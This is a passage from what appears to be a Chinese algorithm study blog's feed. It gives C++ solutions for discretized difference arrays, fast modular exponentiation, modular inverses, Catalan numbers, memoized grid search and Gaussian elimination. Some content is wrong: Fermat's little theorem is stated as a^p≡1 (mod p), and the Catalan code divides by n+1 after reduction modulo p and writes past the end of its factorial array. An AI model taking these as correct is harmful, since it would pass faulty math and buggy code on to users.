class="hljs-built_in">end</span>()),alls.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-comment">// for(int i=0;i&lt;alls.size();i++)</span><br>        <span class="hljs-comment">// &#123;</span><br>        <span class="hljs-comment">//     cout&lt;&lt;alls[i]&lt;&lt;&quot; &quot;;</span><br>        <span class="hljs-comment">// &#125;</span><br>        <span class="hljs-comment">// cout&lt;&lt;endl;</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;add.<span class="hljs-built_in">size</span>();i++)<br>        &#123;<br>            <span class="hljs-type">int</span> l = <span class="hljs-built_in">find</span>(add[i].first);<br>            <span class="hljs-type">int</span> r =<span class="hljs-built_in">find</span>(add[i].second);<br>            a[l]+=<span class="hljs-number">1</span>;<br>            a[r+<span class="hljs-number">1</span>]-=<span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=alls.<span class="hljs-built_in">size</span>();i++)<br>        &#123;<br>            a[i] += a[i<span class="hljs-number">-1</span>];<br>        &#125;<br>        <span class="hljs-comment">// for(int i=0;i&lt;=alls.size();i++)</span><br>        <span class="hljs-comment">// &#123;</span><br>        <span class="hljs-comment">//     cout&lt;&lt;a[i]&lt;&lt;&quot; &quot;;</span><br>        <span class="hljs-comment">// &#125;</span><br>        vector&lt;<span class="hljs-type">int</span>&gt;<span class="hljs-built_in">ans</span>(n);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        &#123;<br>            ans[i]=a[<span class="hljs-built_in">find</span>(persons[i])];<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br><br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>超时原因，离散化后进行差分时 r+1的度量是不一样的，所以要对r+1也进行离散化。<br>因此代码改为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> a[<span class="hljs-number">300005</span>];<br>    vector&lt;<span class="hljs-type">int</span>&gt;alls;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-type">int</span> l =<span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> r= alls.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">while</span>(l&lt;r)<br>        &#123;<br>            <span class="hljs-type">int</span> mid =(l+r)&gt;&gt;<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span>(alls[mid]&gt;=x) r =mid;<br>            <span class="hljs-keyword">else</span> l =mid+<span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> l;<br>    &#125;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">fullBloomFlowers</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; flowers, vector&lt;<span class="hljs-type">int</span>&gt;&amp; persons)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n=persons.<span class="hljs-built_in">size</span>();<br>        vector&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&gt;add;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;flowers.<span class="hljs-built_in">size</span>();i++)<br>        &#123;<br>            <span class="hljs-type">int</span> l  =flowers[i][<span class="hljs-number">0</span>];<br>            <span class="hljs-type">int</span> r =flowers[i][<span class="hljs-number">1</span>];<br>            add.<span class="hljs-built_in">push_back</span>(&#123;l,r&#125;);<br>            alls.<span class="hljs-built_in">push_back</span>(l);<br>            alls.<span class="hljs-built_in">push_back</span>(r);<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        &#123;<br>            alls.<span class="hljs-built_in">push_back</span>(persons[i]);<br>        &#125;<br><br>        <span class="hljs-built_in">sort</span>(alls.<span class="hljs-built_in">begin</span>(),alls.<span class="hljs-built_in">end</span>());<br>        alls.<span class="hljs-built_in">erase</span>(<span class="hljs-built_in">unique</span>(alls.<span class="hljs-built_in">begin</span>(),alls.<span class="hljs-built_in">end</span>()),alls.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span>&amp;p:add)<br>        &#123;<br>            <span class="hljs-type">int</span> l = <span class="hljs-built_in">find</span>(p.first);<br>            <span class="hljs-type">int</span> r = <span class="hljs-built_in">find</span>(p.second+<span class="hljs-number">1</span>);<br>            a[l]+=<span class="hljs-number">1</span>;<br>            a[r]-=<span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;alls.<span class="hljs-built_in">size</span>();i++)<br>        &#123;<br>            a[i]+=a[i<span class="hljs-number">-1</span>];<br>        &#125;<br>        <span class="hljs-comment">//cout&lt;&lt;a[0]&lt;&lt;&quot; &quot;;</span><br>        <span class="hljs-comment">// for(int i=1;i&lt;alls.size();i++)</span><br>        <span class="hljs-comment">// &#123;</span><br>        <span class="hljs-comment">//     cout&lt;&lt;a[i]&lt;&lt;&quot; &quot;;</span><br>        <span class="hljs-comment">// &#125;</span><br>        vector&lt;<span class="hljs-type">int</span>&gt;<span class="hljs-built_in">ans</span>(n);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        &#123;<br>            ans[i] = a[<span class="hljs-built_in">find</span>(persons[i])];<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>顺利通过</p>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>快速幂</title>
    <link href="/2022/12/30/%E5%BF%AB%E9%80%9F%E5%B9%82/"/>
    <url>/2022/12/30/%E5%BF%AB%E9%80%9F%E5%B9%82/</url>
    
    <content type="html"><![CDATA[<h4 id="快速幂"><a href="#快速幂" class="headerlink" title="快速幂"></a>快速幂</h4><p>快速幂的核心思想即为，将幂指数变成二进制的形式，来拆解乘积，减少运算的次数，既预处理又能防止溢出。<br>模板题：<br><a href="https://www.acwing.com/problem/content/submission/code_detail/14148818/">https://www.acwing.com/problem/content/submission/code_detail/14148818/</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">qkm</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b,<span class="hljs-type">int</span> p)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> res =<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span>(b)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(b&amp;<span class="hljs-number">1</span>) res =(<span class="hljs-type">long</span> <span class="hljs-type">long</span>)res*a%p;<br>        b&gt;&gt;=<span class="hljs-number">1</span>;<br>        a=(<span class="hljs-type">long</span> <span class="hljs-type">long</span>)a*a%p;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>    <br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br>    <span class="hljs-keyword">while</span>(n--)<br>    &#123;<br>        <span class="hljs-type">int</span> a,b,p;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d%d&quot;</span>,&amp;a,&amp;b,&amp;p);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,<span class="hljs-built_in">qkm</span>(a,b,p));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="快速幂求逆元"><a href="#快速幂求逆元" class="headerlink" title="快速幂求逆元"></a>快速幂求逆元</h4><h5 id="基础知识："><a href="#基础知识：" class="headerlink" title="基础知识："></a>基础知识：</h5><p>费马小定理：<br>p为质数，且a，p互质则。<br>a^p&#x3D;1(modp)<br>欧拉定理：<br>对任意互素的a，n，有<br>a^phi(n) &#x3D;1 (mod n)<br>费马小定理为欧拉定义的特殊情况。<br>由此可以推出乘法逆元的充要条件。<br><img src="/upload/2022/05/image-32345a416c644b6a88a24777d80106b8.png" alt="image.png"><br>模板：<br><a href="https://www.acwing.com/problem/content/878/">https://www.acwing.com/problem/content/878/</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">qkm</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b,<span class="hljs-type">int</span> p)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> res =<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span>(b)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(b&amp;<span class="hljs-number">1</span>) res =(<span class="hljs-type">long</span> <span class="hljs-type">long</span>)res*a%p;<br>        b&gt;&gt;=<span class="hljs-number">1</span>;<br>        a=(<span class="hljs-type">long</span> <span class="hljs-type">long</span>)a*a%p;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>    <br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br>    <span class="hljs-keyword">while</span>(n--)<br>    &#123;<br>        <span class="hljs-type">int</span> a,p;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;a,&amp;p);<br>        <span class="hljs-type">int</span> res = <span class="hljs-built_in">qkm</span>(a,p<span class="hljs-number">-2</span>,p);<br>        <span class="hljs-keyword">if</span>(a%p!=<span class="hljs-number">0</span>) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,res);<br>        <span class="hljs-keyword">else</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;impossible\n&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>卡特兰数</title>
    <link href="/2022/12/30/%E5%8D%A1%E7%89%B9%E5%85%B0%E6%95%B0/"/>
    <url>/2022/12/30/%E5%8D%A1%E7%89%B9%E5%85%B0%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h4 id="卡特兰数的几何意义"><a href="#卡特兰数的几何意义" class="headerlink" title="卡特兰数的几何意义"></a>卡特兰数的几何意义</h4><p>简单来说，卡特兰数就是一个有规律的数列，在坐标图中可以表示为：从原点(0,0)出发，每次向x轴或者y轴正方向移动1个单位，直到到达(n,n)点，且在移动过程中不越过第一象限平分线的移动方案总数。<br><img src="/upload/2022/05/image-c709df97ebe74d4cae1f48b0e8db63f1.png" alt="image.png"><img src="/upload/2022/05/image-4042be22d04f4ffba166e20307b8d107.png" alt="image.png"><br>模板题:<a href="https://www.acwing.com/activity/content/problem/content/959/">https://www.acwing.com/activity/content/problem/content/959/</a><br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> p =<span class="hljs-number">1e9</span>+<span class="hljs-number">7</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">200005</span>;<br><span class="hljs-type">int</span> fact[N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">qkm</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> res =<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span>(b)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(b&amp;<span class="hljs-number">1</span>) res =(<span class="hljs-type">long</span> <span class="hljs-type">long</span>)res*a%p;<br>        <span class="hljs-comment">//cout&lt;&lt;res&lt;&lt;endl;</span><br>        b&gt;&gt;=<span class="hljs-number">1</span>;<br>        a=(<span class="hljs-type">long</span> <span class="hljs-type">long</span>)a*a%p;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    fact[<span class="hljs-number">1</span>]=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=N;i++)<br>    &#123;<br>        fact[i] = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fact[i<span class="hljs-number">-1</span>]*i%p;<br>        <span class="hljs-comment">//cout&lt;&lt;fact[i]&lt;&lt;endl;</span><br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-type">int</span> a = <span class="hljs-number">2</span>*n;<br>    <span class="hljs-type">int</span> b = n;<br>    <span class="hljs-built_in">init</span>();<br>    <span class="hljs-type">int</span> ans = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fact[a]*<span class="hljs-built_in">qkm</span>(fact[a-b],p<span class="hljs-number">-2</span>)%p;<br>    ans = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ans*<span class="hljs-built_in">qkm</span>(fact[b],p<span class="hljs-number">-2</span>)%p;<br>    <span class="hljs-comment">// cout&lt;&lt;ans&lt;&lt;endl;</span><br>    cout&lt;&lt;(ans/(n+<span class="hljs-number">1</span>))%p&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>记忆化搜索</title>
    <link href="/2022/12/30/%E8%AE%B0%E5%BF%86%E5%8C%96%E6%90%9C%E7%B4%A2/"/>
    <url>/2022/12/30/%E8%AE%B0%E5%BF%86%E5%8C%96%E6%90%9C%E7%B4%A2/</url>
    
    <content type="html"><![CDATA[<p>记忆化搜索理解：在暴力搜索的基础上，记录了搜索的状态，从别的状态搜索过来后不用再重复搜索，减少了时间复杂度。<br><a href="https://www.acwing.com/problem/content/903/">https://www.acwing.com/problem/content/903/</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">301</span>;<br><span class="hljs-type">int</span> m[N][N];<br><span class="hljs-type">int</span> dp[N][N];<br><span class="hljs-type">int</span> dx[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">int</span> dy[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>&#125;;<br><span class="hljs-type">int</span> r,c;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">s</span><span class="hljs-params">(<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> &amp;v = dp[x][y];<br>    <span class="hljs-keyword">if</span>(v!=<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> v;<br>    v =<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)<br>    &#123;<br>        <span class="hljs-type">int</span> nx =x+dx[i];<br>        <span class="hljs-type">int</span> ny =y+dy[i];<br>        <span class="hljs-keyword">if</span>(nx&gt;=<span class="hljs-number">0</span> &amp;&amp; nx&lt;r &amp;&amp; ny&gt;=<span class="hljs-number">0</span>&amp;&amp;ny&lt;c &amp;&amp; m[nx][ny]&lt;m[x][y])<br>        &#123;<br>            v=<span class="hljs-built_in">max</span>(v,<span class="hljs-built_in">s</span>(nx,ny)+<span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> v;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;r,&amp;c);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;r;i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;c;j++)<br>        &#123;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;m[i][j]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-type">int</span> ans =<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;r;i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;c;j++)<br>        &#123;<br>            ans = <span class="hljs-built_in">max</span>(ans,<span class="hljs-built_in">s</span>(i,j));<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,ans);<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://leetcode.cn/problems/number-of-increasing-paths-in-a-grid/">https://leetcode.cn/problems/number-of-increasing-paths-in-a-grid/</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-type">int</span> m;<br>    <span class="hljs-type">int</span> mod;<br>    <span class="hljs-type">int</span> dx[<span class="hljs-number">4</span>] =&#123;<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> dy[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">-1</span>&#125;;<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;dp;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y,vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp;grid)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-type">int</span>&amp; v = dp[x][y];<br>        <span class="hljs-keyword">if</span>(v!=<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> v;<br>        v = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)<br>        &#123;<br>            <span class="hljs-type">int</span> nx= x+dx[i];<br>            <span class="hljs-type">int</span> ny = y+dy[i];<br>            <span class="hljs-keyword">if</span>(nx&gt;=<span class="hljs-number">0</span> &amp;&amp; nx&lt;m &amp;&amp; ny&gt;=<span class="hljs-number">0</span> &amp;&amp; ny&lt;n &amp;&amp; grid[nx][ny]&gt;grid[x][y])<br>            &#123;<br>                v =(v+<span class="hljs-built_in">dfs</span>(nx,ny,grid))%mod;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> v;<br>    &#125;;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">countPaths</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;<br>        <span class="hljs-type">int</span> ans =<span class="hljs-number">0</span>;<br>        m =grid.<span class="hljs-built_in">size</span>();<br>        n = grid[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>();<br>        mod = <span class="hljs-number">1e9</span>+<span class="hljs-number">7</span>;<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;<span class="hljs-built_in">dp</span>(m,<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(n,<span class="hljs-number">0</span>));<br>        <span class="hljs-keyword">this</span>-&gt;dp = dp;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;m;i++)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)<br>            &#123;<br>                ans =(ans+<span class="hljs-built_in">dfs</span>(i,j,grid))%mod;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>高斯消元解线性方程组</title>
    <link href="/2022/12/30/%E9%AB%98%E6%96%AF%E6%B6%88%E5%85%83%E8%A7%A3%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/"/>
    <url>/2022/12/30/%E9%AB%98%E6%96%AF%E6%B6%88%E5%85%83%E8%A7%A3%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/</url>
    
    <content type="html"><![CDATA[<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>求方程组的解即为线性代数中Ax&#x3D;b的解。<br>通过高斯消元，将每一个要解的变量系数化为1。<br>若主对角线上均为1，则正好有一组解，带回求解即可。<br>若有一组方程化简完后为 0&#x3D;0形式，则有无数组解。<br>若有一组方程为，0 &#x3D; b的形式，那么则无解。<br>代码即为模拟消元的过程：<br>模板题：<a href="https://www.acwing.com/problem/content/885/">https://www.acwing.com/problem/content/885/</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 